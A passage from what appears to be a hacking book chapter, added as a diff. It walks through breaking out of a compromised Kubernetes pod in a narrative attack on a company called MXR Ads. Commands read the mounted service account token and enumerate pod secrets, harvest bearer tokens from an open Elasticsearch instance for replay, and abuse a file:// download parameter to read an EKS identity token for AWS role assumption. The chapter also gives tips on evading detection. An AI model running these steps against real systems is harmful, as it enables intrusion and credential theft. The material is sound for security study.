@@ -1,0 +1,974 @@
+<html><head></head><body>
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="121" id="Page_121"/>8</span><br/>
+<span class="ChapterTitle">Shawshank Redemption: Breaking Out</span></h1>
+</header>
+<figure class="opener">
+<img src="image_fi/book_art/chapterart.png" alt=""/>
+</figure>
+<p class="ChapterIntro">Armed with this new understanding of Kubernetes, we head back to our improvised remote shell on the survey application to gather information, escalate privileges, and hopefully find our way to interesting data about user targeting.</p>
+<p>We resume our earlier shell access on the surveyapp container and take a look at the environment variables:</p>
+
+<pre><code>shell&gt; <b>env</b>
+
+KUBERNETES_SERVICE_PORT_HTTPS=443
+KUBERNETES_PORT_443_TCP_PORT=443
+KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443</code></pre>
+
+<p><span epub:type="pagebreak" title="122" id="Page_122"/>With our new knowledge, these environment variables take on a new meaning: <code>KUBERNETES_PORT_443_TCP</code> must refer to the cluster IP hiding the API server, the famous Kube orchestrator. The documentation states that the API follows the OpenAPI standard, so we can target the default <em>/api</em> route using the infamous <code>curl</code> utility. The <code>-L</code> switch in <code>curl</code> follows HTTP redirections, while the <code>-k</code> switch ignores SSL certificate warnings. We give it a go in <a href="#listing8-1" id="listinganchor8-1">Listing 8-1</a>.</p>
+
+<pre><code>shell&gt; <b>curl -Lk https://10.100.0.1/api</b>
+
+message: forbidden: User "system:anonymous" cannot get path "/api",
+reason: Forbidden</code></pre>
+
+<p class="CodeListingCaption"><a id="listing8-1">Listing 8-1</a>: Attempting to access the default <em>/api</em> route on the API server</p>
+<p>Ah, we’re locked out. The response we get is all but surprising. Starting from version 1.8, Kubernetes released a stable version of <em>role-based access control</em><em> (RBAC</em><em>)</em>, a security model that locks access to the API server to unauthorized users. Even the “insecure” API listening on port 8080 is restricted to the localhost address:</p>
+
+<pre><code>shell&gt; <b>curl -L http://10.100.0.1:8080</b>
+(timeout)</code></pre>
+
+<p>To see if we can get around this, we’ll take a closer look at the Kubernetes RBAC system.</p>
+<h2 id="h1-501263c08-0001">RBAC in Kube</h2>
+<p class="BodyFirst">Kubernetes RBAC follows a pretty standard implementation. Admins can create user accounts for human operators or service accounts that can be assigned to pods. Each user or service account is further bound to a role holding particular privileges—<code>get</code>, <code>list</code>, <code>change</code>, and so on—over resources such as pods, nodes, and secrets. The association between a subject (user or service account) and a role is called a <em>binding</em>.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	A <em>secret</em> in Kubernetes is a piece of sensitive data stored in the etcd database and subject to access control. It provides an alternative to hardcoding passwords in the pod’s manifest. The secret is injected at runtime through environment variables or a mounted filesystem.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>Just like any other Kube resource, service accounts, roles, and their bindings are defined in manifest files stored in the etcd database. A service account definition looks something like <a href="#listing8-2" id="listinganchor8-2">Listing 8-2</a>.</p>
+
+<pre><code># define a service account
+
+apiVersion: v1
+kind: ServiceAccount   # deploy a service account
+<span epub:type="pagebreak" title="123" id="Page_123"/>metadata:
+  - name: metrics-ro   # service account's name
+--
+# Bind metrics-ro account to cluster admin role
+
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: manager-binding # binding's name
+subjects:
+- kind: ServiceAccount
+  name: metrics-ro      # service account's name
+  apiGroup: ""
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin # default role with all privileges
+  apiGroup: ""</code></pre>
+
+<p class="CodeListingCaption"><a id="listing8-2">Listing 8-2</a>: The <code>ClusterRoleBinding</code> manifest file</p>
+<p>An admin who wants to assign a service account to a regular pod can add the single property <code>serviceAccountName</code>, like so:</p>
+
+<pre><code>apiVersion: v1
+kind: Pod  # We want to deploy a Pod
+metadata:
+<var>--snip--</var>
+spec:
+  containers:
+    serviceAccountName: metrics-ro
+    - name: nginx   # First container
+<var>--snip--</var></code></pre>
+
+<p>Earlier, we hit the API server without providing any kind of authentication—so we naturally got assigned the default <code>system:anonymous</code> user, which lacks any privileges. This prevented us from accessing the API server. Common sense would dictate, then, that a container lacking the <code>serviceAccountName</code> attribute would also inherit the same anonymous account status.</p>
+<p>That's a sensible assumption, but Kube operates differently. Every pod without a service account is automatically assigned the <code>system:serviceaccount:default:default</code> account. Notice the subtle difference between “anonymous” and “default.” Default seems less dangerous than anonymous. It carries more trust. It even has an authentication token mounted inside the container!</p>
+<p>We search for the service account mounted by default by the container:</p>
+
+<pre><code>shell&gt; <b>mount |grep -i secrets</b>
+tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
+
+shell&gt; <b>cat /run/secrets/kubernetes.io/serviceaccount/token</b>
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRi...</code></pre>
+
+<p><span epub:type="pagebreak" title="124" id="Page_124"/>The account token is actually a signed JavaScript Object Notation (JSON) string—also known as a <em>JSON Web Token</em> (<em>JWT</em>)—holding information identifying the service account. We can base64-decode a portion of the JWT string to confirm the identity of the default service account and get a bit of information:</p>
+
+<pre><code>shell&gt; <b>cat /run/secrets/kubernetes.io/serviceaccount/token \</b>
+<b>| cut -d "." -f 2 \</b>
+<b>| base64 -d</b>
+
+{
+"iss": "kubernetes/serviceaccount",
+
+"kubernetes.io/serviceaccount/namespace": "prod",
+
+"kubernetes.io/serviceaccount/secret.name": "default-token-2mpcg",
+
+"kubernetes.io/serviceaccount/service-account.name": "default",
+
+"kubernetes.io/serviceaccount/service-account.uid": "956f6a5d-0854-11ea-9d5f-06c16d8c2dcc",
+
+"sub": "system:serviceaccount:prod:default"
+}</code></pre>
+
+<p>A JWT has several regular fields, also called <em>registered claims</em>: the issuer (<code>iss</code>), which in this case is the Kubernetes service account controller; the subject (<code>sub</code>), which is the account’s name; and the namespace (more on this in a moment), which in this case is <code>prod</code>. Obviously, we cannot alter this information to impersonate another account without invalidating the signature appended to this JSON file.</p>
+<p>The <em>namespace</em> is a logical partition that separates groups of Kube resources, such as pods, service accounts, secrets, and so on, generally set by the admin. It’s a soft barrier that allows more granular RBAC permissions; for example, a role with the “list all pods” permission would be limited to listing pods belonging to its namespace. The default service account is also namespace-dependent. The canonical name of the account we just retrieved is <code>system:serviceaccount:prod:default</code>.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	I describe the namespace as a “soft” isolation scheme because nodes are not subject to namespaces. Admins can always ask the kube-scheduler to only assign pods of a given namespace to nodes with a given tag or annotation, but many feel that this sort of defeats the whole point of Kubernetes. Furthermore, all network traffic is routed by default inside the cluster regardless of the namespace.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>This token gives us a second opportunity to query the API server. We load the file’s content into a <code>TOKEN</code> variable and retry our first HTTP request from <a href="#listing8-1">Listing 8-1</a>, sending the <code>TOKEN</code> variable as an <code>Authorization</code> header:</p>
+
+<pre><code>shell&gt; <b>export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)</b>
+
+shell&gt; <b>curl -Lk https://10.100.0.1/api --header "Authorization: Bearer $TOKEN"</b>
+
+<span epub:type="pagebreak" title="125" id="Page_125"/>  "kind": "APIVersions",
+  "versions": ["v1"],
+  "serverAddressByClientCIDRs": [{
+    "clientCIDR": "0.0.0.0/0",
+    "serverAddress": "ip-10-0-34-162.eu-west-1.compute.internal:443"
+  }]</code></pre>
+
+<p>Ho! It seems that the default service account indeed has more privileges than the anonymous account. We’ve managed to grab a valid identity inside the cluster.</p>
+<h2 id="h1-501263c08-0002">Recon 2.0</h2>
+<p class="BodyFirst">Time for some reconnaissance. We download the API specification available on the <em>https://10.100.0.1/openapi/v2 </em>endpoint and explore our options.</p>
+<p>We start by fetching the cluster’s <em>/version</em> endpoint. If the cluster is old enough, there may be the possibility to leverage a public exploit to elevate privileges:</p>
+
+<pre><code>shell&gt; <b>curl -Lk https://10.100.0.1/version --header "Authorization: Bearer $TOKEN"</b>
+{
+    "major": "1",
+    "minor": "14+",
+    "gitVersion": "v1.14.6-eks-5047ed",
+    "buildDate": "2019-08-21T22:32:40Z",
+    "goVersion": "go1.12.9",
+<var>--snip--</var>
+}</code></pre>
+
+<p>MXR Ads is running Kubernetes 1.14 supported by Elastic Kubernetes Service (EKS), AWS’s managed version of Kubernetes. In this setup, AWS hosts the API server, etcd, and other controllers on their own pool of master nodes, also called the <em>controller plane</em>. The customer (MXR Ads, in this case) only hosts the worker nodes (data plane).</p>
+<p>This is important information because AWS’s version of Kube allows a stronger binding between IAM roles and service accounts than the self-hosted version. If we pwn the right pod and grab the token, we not only can attack the Kube cluster but also AWS resources!</p>
+<p>We continue our exploration by trying several API endpoints from the OpenAPI documentation we retrieved. We try <em>api/v1/namespaces/default/secrets/</em>, <em>api/v1/namespaces/default/serviceaccounts</em>, and a bunch of other endpoints that correspond to Kube resources, but we repeatedly get shut down with a 401 error message. If we continue like this, the error rate will draw unnecessary attention. Luckily, there is a Kube API called <em>/apis/authorization.k8s.io/v1/selfsubjectaccessreview </em>that tells us right away if we can perform an action on a given object.</p>
+<p>It’s a hassle to call it manually through a <code>curl</code> query, as that would require a long and ugly payload in JSON, so we download the Kubectl program through our reverse shell. This time we don’t need to set up a config file, because Kubectl autodiscovers environment variables injected by the cluster, <span epub:type="pagebreak" title="126" id="Page_126"/>loads the current token from the mounted directory, and is 100 percent operational right away. Here we download the Kubectl binary, make it executable, and retrieve the cluster version once more:</p>
+
+<pre><code>shell&gt; <b>wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/kubectl</b>
+
+shell&gt; <b>chmod +x kubectl &amp;&amp; ./kubectl version</b>
+
+Server Version: version.Info {Major:"1", Minor:"14+", GitVersion:"v1.14.6-eks-5047ed"...</code></pre>
+
+<p>Perfect! Everything is working fine. Now we repeatedly call the <code>auth can-i</code> command on the most common instructions—<code>get pods</code>, <code>get services</code>, <code>get roles</code>, <code>get secrets</code>, and so on—to fully explore all the privileges assigned to this default token we are operating with:</p>
+
+<pre><code>shell&gt; ./<b>kubectl version auth can-i get nodes</b>
+no
+shell&gt; ./<b>kubectl version auth can-i get pods</b>
+yes</code></pre>
+
+<p>We quickly come to the conclusion that the only permission we currently have is to list pods in the cluster. But when we explicitly call the <code>get pods</code> command, we get the following error:</p>
+
+<pre><code>shell&gt;<b> ./kubectl get pods</b>
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:prod:default" cannot list resource "pods" in
+API group "" in the namespace "default"</code></pre>
+
+<p>What if we try targeting the <code>prod</code> namespace—the same one hosting our service account?</p>
+
+<pre><code>shell&gt; ./<b>kubectl get pods -n prod</b>
+
+stats-deployment-41de-4jxa1     1/1 Running   0    13h51m
+
+redis-depl-69dc-0vslf           1/1 Running   0    21h43m
+
+ssp-elastic-depl-3dbc-3qozx     1/1 Running   0    14h39m
+
+ssp-feeder-deployment-13fe-3evx 1/1 Running   0    10h18m
+
+api-core-deployment-d34c-7qxm   1/1 Running   0    10h18m
+<var>--snip--</var></code></pre>
+
+<p>Not bad! We get a list of hundreds and hundreds of pods running in the <code>prod</code> namespace.</p>
+<p>Since all pods lacking an identity run with the same default service account, if one person grants extra privileges to this default account, all the other pods running with the same identity will automatically inherit these same privileges. All it takes is for someone to execute an unwitting <code>kubectl apply -f </code><var>&lt;url&gt;</var> that grabs an ill-conceived resource definition from an obscure <span epub:type="pagebreak" title="127" id="Page_127"/>GitHub repo and hastily apply it to the cluster. It is sometimes said that this Kubectl installation command is the new <code>curl </code><var>&lt;url&gt;</var><code> | sh</code>. That’s the hidden cost of complexity: people can blindly pull and apply manifest files from GitHub without inspecting or even understanding the implications of the very instructions they execute, sometimes even granting extra privileges to the default service account. This is probably what occurred in this case, since the default account has no built-in set of privileges.</p>
+<p>But that’s just the tip of the iceberg. With the right flags, we can even pull the entire manifest of each pod, giving us an absolute plethora of information, as shown in <a href="#listing8-3" id="listinganchor8-3">Listing 8-3</a>.</p>
+
+<pre><code>shell&gt;<b> ./kubectl get pods -n prod -o yaml &gt; output.yaml</b>
+shell&gt; <b>head -100 output.yaml</b>
+
+<var>--snip--</var>
+spec:
+  containers:
+  - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/api-core
+    name: api-core
+  - env:
+    - name: DB_CORE_PASS
+      valueFrom:
+        secretKeyRef:
+          key: password
+          name: dbCorePassword
+    volumeMounts:
+    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+      name: apicore-token-2mpcg
+      readOnly: true
+  nodeName: ip-192-168-162-215.eu-west-1.compute.internal
+  hostIP: 192.168.162.215
+  phase: Running
+  podIP: 10.0.2.34
+<var>--snip--</var></code></pre>
+
+<p class="CodeListingCaption"><a id="listing8-3">Listing 8-3</a>: Downloading the pod manifest file</p>
+<p>And that truncated output, my friends, was just barely one pod! We only have the permission to get pod information, but that fortunately means accessing the pod manifest files, which include the nodes the pods are running on, the names of secrets, service accounts, mounted volumes, and much more. That’s almost full reconnaissance at the namespace level with one tiny permission.</p>
+<p>The output, though, is horribly unexploitable. Manually digging through YAML files is a form of punishment that should only be bestowed on your archenemy. We can format the result from <a href="#listing8-3">Listing 8-3</a> using Kubectl’s powerful custom output filters:</p>
+
+<pre><code>shell&gt; <b>./kubectl get pods -o="custom-columns=\</b>
+<b>NODE:.spec.nodeName,\</b>
+<b>POD:.metadata.name"</b>
+
+<span epub:type="pagebreak" title="128" id="Page_128"/>NODE                       POD
+ip-192-168-162-215.eu-...  api-core-deployment-d34c-7qxm
+ip-192-168-12-123.eu-...   ssp-feeder-deployment-13fe-3evx
+ip-192-168-89-110.eu-...   redis-depl-69dc-0vslf
+ip-192-168-72-204.eu-...   audit-elastic-depl-3dbc-3qozx</code></pre>
+
+<p>This rather explicit command only displays the <code>spec.nodeName</code> and <code>metadata.name </code>fields of the pods’ manifests. Let’s get some additional data, like secrets, service accounts, pod IPs, and so on. As you can see in <a href="#listing8-4" id="listinganchor8-4">Listing 8-4</a>, the filter grows thicker to read, but it essentially walks through arrays and maps in YAML to fetch the relevant information.</p>
+
+<pre><code>shell&gt; <b>./</b> <b>kubectl get pods -o="custom-columns=\</b>
+<b>NODE:.spec.nodeName,\</b>
+<b>POD:.metadata.name,\</b>
+<b>PODIP:.status.podIP,\</b>
+<b>SERVICE:.spec.serviceAccount,\</b>
+<b>ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\</b>
+<b>FILESECRET:.spec.volumes[*].secret.secretName"</b>
+
+NODE       POD       PODIP       SERVICE    ENV           FILESECRET
+ip-192...  api-...   10.0.2...   api-token  dbCore...     api-token-...
+ip-192...  ssp-f...  10.10...    default    dbCass...     default-...
+ip-192...  ssp-r...  10.0.3...   default    &lt;none&gt;        default-...
+ip-192...  audit...  10.20...    default    &lt;none&gt;        default-...
+ip-192...  nexus...  10.20....   default    &lt;none&gt;        deploy-secret...</code></pre>
+
+<p class="CodeListingCaption"><a id="listing8-4">Listing 8-4</a>: Full recon at the namespace level: node and pod names, pod IPs, service accounts, and secrets</p>
+<p>I’ve truncated the output to fit on the page, so I’ll describe it here. The first two columns contain the names of the node and the pod, which help us deduce the nature of the application running inside. The third column is the pod’s IP, which gets us straight to the application, thanks to Kube’s flat network design.</p>
+<p>The fourth column lists the service account attached to each pod. Any value other than <code>default</code> means that the pod is likely running with additional privileges.</p>
+<p>The last two columns list the secrets loaded by the pod, either via environment variables or through a file mounted on disk. Secrets can be database passwords, service account tokens like the one we used to perform this command, and so on.</p>
+<p>What a great time to be a hacker! Remember when reconnaissance entailed scanning the /16 network and waiting four hours to get a partially similar output? Now it’s barely one command away. Of course, had the default service account lacked the “get pods” privilege, we would have had to resort to a blind network scan of our container’s IP range. AWS is very keen on this kind of unusual network traffic, so be careful when tuning your Nmap to stay under the radar.</p>
+<p><span epub:type="pagebreak" title="129" id="Page_129"/>The pod names we retrieved in <a href="#listing8-4">Listing 8-4</a> are full of advertising and technical keywords such as SSP, api, kakfa, and so forth. It’s safe to assume that MXR Ads runs all its applications involved in the ad delivery process on Kubernetes. This must allow them to scale their applications up and down according to traffic. We continue exploring other pods and come across some containers that literally load AWS credentials. Oh, this is going to hurt:</p>
+
+<pre><code>NODE       ip-192-168-162-215.eu-west-1.compute.internal
+POD        creative-scan-depl-13dd-9swkx
+PODIP      10.20.98.12
+PORT       5000
+SERVICE    default
+ENV        AWS_SCAN_ACCESSKEY, AWS_SCAN_SECRET
+FILESECRET default-token-2mpcg</code></pre>
+
+<p>We also spot a couple of datastores, like Redis and Elasticsearch. This is going to be interesting.</p>
+<h2 id="h1-501263c08-0003">Breaking Into Datastores</h2>
+<p class="BodyFirst">Our most crucial advantage right now is the fact that we managed to cross the firewall border. We are inside the cluster, within the so-called <em>trusted zone</em>. DevOps admins still operate under the false pretense that there is such a thing as a trusted network, even when the damn thing belongs to a cloud provider. John Lambert’s piece on the defender’s mindset (<a href="https://github.com/JohnLaTwC/Shared" class="LinkURL">https://github.com/JohnLaTwC/Shared</a>) is still on point: “Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win.”</p>
+<p>Redis is a key-value memory database mostly used for caching purposes, and Elasticsearch is a document-based database geared toward text search queries. We gather from this pod’s description that Elasticsearch is used for storing audit logs of some, and maybe all, applications:</p>
+
+<pre><code>NODE       ip-192-168-72-204.eu-west-1.compute.internal
+POD        audit-elastic-depl-3dbc-3qozx
+PODIP      10.20.86.24
+PORT       9200
+SERVICE    default
+ENV.       &lt;none&gt;
+FILESECRET default-token-2mpcg</code></pre>
+
+<p>Authentication and encryption are the first measures dropped due to the trusted network nonsense. I have yet to stumble upon a Redis database in an internal network that requires authentication. The same goes for Elasticsearch and other famous nonrelational databases that jokingly ask admins to run the application in a “secure” environment, whatever that means.</p>
+<p>I understand. Security is supposedly not the job of the admin; they’d rather focus on performance, availability, and consistency of data. But this mindset is not only flawed, it’s reckless. Security is the foremost requirement <span epub:type="pagebreak" title="130" id="Page_130"/>of any data-driven technology. Data holds information. Information equals power. This has been true ever since humans learned to gossip. Admins ignoring security is like a nuclear plant stating that its only job is to split uranium isotopes. Safety measures? “No, we don’t do that. We run the reactor inside a secure building.”</p>
+<p>We choose to focus first on the Elasticsearch pods, since audit logs always prove to be a valuable source of intelligence. They’ll document things like which service is communicating with which database, what URL endpoints are active, and what database queries look like. We can even find passwords in environment variables neglectfully dumped into debug stack traces.</p>
+<p>We go back to Elasticsearch’s pod description, extract the pod’s IP (10.20.86.24) and port (9200), and prepare to query the service. Elasticsearch is shipped with zero authentication by default, so thanks to the “trusted environment” fairytale, we have full access to the data stored in it.</p>
+<p>Elasticsearch organizes its data into <em>indexes</em>,<em> </em>which are just collections of documents. Think of an index as the equivalent of a database in a traditional relational database system like MySQL. Here we pull a list of the indices defined in the cluster:</p>
+
+<pre><code>shell&gt; <b>curl "10.20.86.24:9200/_cat/indices?v"</b>
+
+health index id                          size
+yellow test  CX9pIf7SSQGPZR0lfe6UVQ...   4.4kb
+yellow logs  dmbluV2zRsG1XgGskJR5Yw...   154.4gb
+yellow dev   IWjzCFc4R2WQganp04tvkQ...   4.4kb</code></pre>
+
+<p>We see there’s 154GB of audit log data ready to be explored. We pull the last couple of documents from the log index:</p>
+
+<pre><code>shell&gt; <b>curl "10.20.86.24:9200/log/_search?pretty&amp;size=4"</b>
+
+"hits": [{
+<var>--snip--</var>
+  "_source": {
+<span class="CodeAnnotation" aria-label="annotation1">1</span> "source": "dashboard-7654-1235",
+  "level": "info",
+<span class="CodeAnnotation" aria-label="annotation2">2</span> "message": "GET /api/dashboard/campaign...\n
+  Host: api-core\nAuthorization Bearer 9dc12d279fee485...",
+  "timestamp": "2019-11-10T14:34:46.648883"
+}}]</code></pre>
+
+<p>The <code>message</code> field of each of the four elements returned by Elasticsearch contains the raw log message stored. We dig up what appears to be an HTTP request to the <a href="http://api/dashboard/campaign/1395412512" class="LinkURL">api/dashboard/campaign/1395412512</a> URL <span class="CodeAnnotation" aria-label="annotation2">2</span>. We also catch a reference to the dashboard application we spotted way back in our external reconnaissance phase in Chapter 4 <span class="CodeAnnotation" aria-label="annotation1">1</span>. The URL in the audit log suggests that campaign data loaded by the dashboard app is likely retrieved from some internal endpoint named <code>api-core</code> (see the <code>Host</code> header) <span class="CodeAnnotation" aria-label="annotation2">2</span>.</p>
+<p><span epub:type="pagebreak" title="131" id="Page_131"/>Interestingly the HTTP message we retrieved carries an authorization token, probably to identify the user requesting the data. We can zero in on all the tokens stored in the log index by applying the proper search filter in Elasticsearch: <code>message:Authorization</code>. This should allow us to gather enough tokens to impersonate all currently active users on the dashboard application:</p>
+
+<pre><code>shell&gt; <b>curl "10.20.86.24:9200/log/_search?pretty&amp;size=12&amp;q=message:Authorization"</b>
+
+"_timestamp": 1600579234
+"message": "...Host: api-core\nAuthorization Bearer 8b35b04bebd34c1abb247f6baa5dae6c..."
+
+"_timestamp": 1600581600
+"message": "...Host: api-core\nAuthorization Bearer 9947c7f0524965d901fb6f43b1274695..."
+<var>--snip--</var></code></pre>
+
+<p>Good, we have over a dozen tokens used in the last 12 hours to access the dashboard app and, by extension, the api-core pods. Hopefully some of them will still be valid and can be used for a replay attack.</p>
+<p>We can reach the pods behind the <code>api-core</code> service name thanks to Kube’s automatic DNS resolution. Alternatively, we can always just pull one of the pods’ IP address, like so:</p>
+
+<pre><code>shell&gt; <b>kubectl get pods -o wide | grep "api-core"</b>
+
+NODE     ip-192-168-162-215.eu-west-1.compute.internal
+POD      api-core-deployment-d34c-7qxm
+PODIP    10.0.2.34
+PORT     8080</code></pre>
+
+<p>We replay a random URL we extracted from the audit index, complete with its authorization token:</p>
+
+<pre><code>shell&gt; <b>curl http://10.0.2.34/api/dashboard/campaign/1395412512 \</b>
+<b>-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"</b>
+{
+   "progress": "0.3",
+   "InsertionID": "12387642",
+   "creative": "s4d.mxrads.com/7bcdfe206ed7c1159bb0152b7/...",<span class="CodeAnnotation" aria-label="annotation1">1</span>
+   "capping": "40",
+   "bidfactor": "10",
+<var>--snip--</var></code></pre>
+
+<p>We’re in! We may not have access to the pretty dashboards to visualize these metrics—not yet anyway—but we finally caught a glimpse of partial raw campaign data. Bonus: we retrieved the location of video files and images served in ads <span class="CodeAnnotation" aria-label="annotation1">1</span>. Let’s take a look at that URL:</p>
+
+<pre><code>root@Point1:/# <b>getent -t hosts s4d.mxrads.com</b>
+13.225.38.103   s4d.mxrads.com.s3.amazonaws.com</code></pre>
+
+<p><span epub:type="pagebreak" title="132" id="Page_132"/>Surprise, surprise, it redirects to an S3 bucket. We see if we can get into that bucket but, sadly, we are not allowed to list its contents, and the keys appear too random to brute-force. Maybe the API provides a way to search by client name to ease our burden?</p>
+<h3 id="h2-501263c08-0001">API Exploration</h3>
+<p class="BodyFirst">We want to find a method in the API to list client names, videos, and anything else that might be relevant. We start messing with the API, sending invalid IDs and random URL paths, along with our valid bearer token, in the hope of triggering any kind of help message or verbose error:</p>
+
+<pre><code>shell&gt; <b>curl "http://10.0.2.34/api/randomPath" \</b>
+<b>-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"</b>
+
+{"level":"critical","message":"Path not found. Please refer to the docs
+(/docs/v3) for more information"...</code></pre>
+
+<p>We’re directed to some documentation URL. One query to the <em>/docs/v3</em> URL spills out the entire documentation of the API: which endpoints are available, parameters to send, headers to include, and so much more. How nice of them!</p>
+<p>It turns out that our hunch was not so far from the truth: the authorization token is indeed tied to an end user and the scope of their campaigns. The random tokens we grabbed are unlikely eligible to view or edit Gretsch Politico’s campaigns (unless, of course, there happens to be an active GP user or admin currently communicating with the api-core pod—but come on, we both know that Christmas is not due for another couple of months).</p>
+<p>The docs make it clear that the api-core endpoint is the entry point of literally every delivery app used by MXR Ads. It is their main database abstraction layer. It aggregates business information from multiple data sources and provides a single unified overview of the delivery process.</p>
+<p>Apart from the regular commands you would expect from an all-powerful API (fetching campaigns, listing insertions, finding exclusion lists, and so on), the documentation mentions an extra feature that tickles our hacker intuition: usage reports. This feature is described as follows: “the <em>/usage-report</em> endpoint generates a report file detailing the health of the API and several metrics to track its performance and configuration<em>.</em>”</p>
+<p>Configuration is nice. We like the word <em>configuration</em>. Configuration data often holds passwords, endpoint definitions, and other API secrets. But there is more. That report file they mentioned . . . how is it generated? How is it retrieved? Do we get to download it? If so, can we alter the URL to grab another file instead? Are there any checks? The dynamic aspect of report generation may give us an entry point.</p>
+<p>Let’s give this report usage feature the old college try. We attempt to generate a report to inspect it more closely:</p>
+
+<pre><code>shell&gt; <b>curl http://10.0.2.34/usage-report/generate"</b>
+<b>-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"</b>
+{
+<span epub:type="pagebreak" title="133" id="Page_133"/>    "status": "success",
+    "report": "api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4               .html"
+}
+
+shell&gt; <b>curl api-core/usage-report/file/?download=s3://mxrads-reports/98de2cabef81235dead4.html</b>
+
+<var>--snip--</var>
+Internal configuration:
+Latency metrics:
+Environment:
+PATH_INFO: '/usage-report'
+PWD '/api/'
+SHELL '/bin/bash/'
+
+AWS_ROLE_ARN 'arn:aws:iam::886477354405:role/api-core.ec2'<span class="CodeAnnotation" aria-label="annotation1">1</span> 
+
+AWS_WEB_IDENTITY_TOKEN_FILE '/var/run/secrets/eks.amazonaws.com/serviceaccount/token'<span class="CodeAnnotation" aria-label="annotation2">2</span> 
+
+DB_CORE_PASS **********
+DB_CORE_USER **********
+DBENDPOINT=984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com <span class="CodeAnnotation" aria-label="annotation3">3</span> 
+<var>--snip--</var></code></pre>
+
+<p>Very interesting indeed! Lucky for MXR Ads, the developers of the usage report generator masked the database user and password, so there’s no easy access there, but we still got the database endpoint <span class="CodeAnnotation" aria-label="annotation3">3</span>: <code>984195.cehmrvc73g1g.eu-west-1.rds.amazonaws.com</code>. Evidently, data is fetched from a managed relational database on AWS—a service called RDS.</p>
+<p>But never mind the database for now. We’ve spotted something that might give us a little more power.</p>
+<p>We’re going to focus on the two special variables: <code>AWS_ROLE_ARN</code> and <code>AWS_WEB_IDENTITY_TOKEN_FILE</code>. According to the AWS documentation, these two variables are injected by AWS’s managed version of Kubernetes (EKS) whenever an IAM role is attached to a Kube service account. The api-core pod here can exchange its Kube authentication token for regular IAM access keys that carry the privileges of the api-core.ec2 role <span class="CodeAnnotation" aria-label="annotation1">1</span>. An excellent privilege promotion!</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	Some companies with a different setup may have no choice but to allow all pods running on a given node to impersonate the role assigned to that node. Our job then becomes orders of magnitude easier. Others will proxy all requests using a tool like kube2iam to limit the reach of a pod.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>It would be interesting to load the service account token stored in the file referenced by <code>AWS_WEB_IDENTITY_TOKEN_FILE</code> and exchange it for IAM access keys to see what we can and can’t access with those keys.</p>
+<p><span epub:type="pagebreak" title="134" id="Page_134"/>The <code>usage-report</code> function may well help us in this endeavor. The download URL points to an S3 URL, but chances are it accepts other URL handlers as well, such as <code>file://</code> to load documents from disk, like the service <code>AWS_WEB_IDENTITY_TOKEN_FILE </code>token file <span class="CodeAnnotation" aria-label="annotation2">2</span>:</p>
+
+<pre><code>shell&gt; <b>curl api-core/usage-report/file?download=\</b>
+<b>file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token</b>
+
+eyJhbGciOiJSUzI1NiIsImtpZCI6ImQxNWY4MzcwNjI5Y2FmZGRiOGNjY2UzNjBiYzFjZGMwYWY4Zm...</code></pre>
+
+<p>It’s so nice when things work out as intended! We get a service account token. Let’s see if we can exchange it for IAM keys. If we decode this token and compare it to the default JWT we got earlier, we will notice some key differences:</p>
+
+<pre><code>{
+<span class="CodeAnnotation" aria-label="annotation1">1</span> "aud": ["sts.amazonaws.com"],
+  "exp": 1574000351,
+<span class="CodeAnnotation" aria-label="annotation2">2</span> "iss": "https://oidc.eks.eu-west-1.amazonaws.com/id/4BAF8F5",
+  "kubernetes.io": {
+    "namespace": "prod",
+<var>--snip--</var>
+    "serviceaccount": {
+      "name": "api-core-account",
+      "uid": "f9438b1a-087b-11ea-9d5f-06c16d8c2dcc"
+    }
+  "sub": "system:serviceaccount:prod:api-core-account"
+}</code></pre>
+
+<p>The service account token has an audience property, <code>aud</code> <span class="CodeAnnotation" aria-label="annotation1">1</span>, that is the resource server that will accept the token we just decoded. Here it’s set to STS—the AWS service that grants temporary IAM credentials. The token’s issuer <span class="CodeAnnotation" aria-label="annotation2">2</span> is no longer the service account controller, but is instead an OpenID server provisioned along with the EKS cluster. <em>OpenID</em> is an authentication standard used to delegate authentication to a third party. AWS IAM trusts this OpenID server to properly sign and authenticate claims in this JWT.</p>
+<p>According to the AWS documentation, if everything has been set up properly, the IAM role api-core.ec2 will also be configured to trust impersonation requests issued by this OpenID server and bearing the subject claim <code>system:serviceaccount:prod:api-core-account</code>.</p>
+<p>When we call the <code>aws sts assume-role-with-web-identity</code> API and provide the necessary information (web token and role name), we should get back valid IAM credentials:</p>
+
+<pre><code>root@Pointer1:/# <b>AWS_ROLE_ARN="arn:aws:iam::886477354405:role/api-core.ec2"</b>
+root@Pointer1:/# <b>TOKEN ="ewJabazetzezet..."</b>
+
+root@Pointer1:/# <b>aws sts assume-role-with-web-identity \</b>
+<b>--role-arn $AWS_ROLE_ARN \</b>
+<b>--role-session-name sessionID \</b>
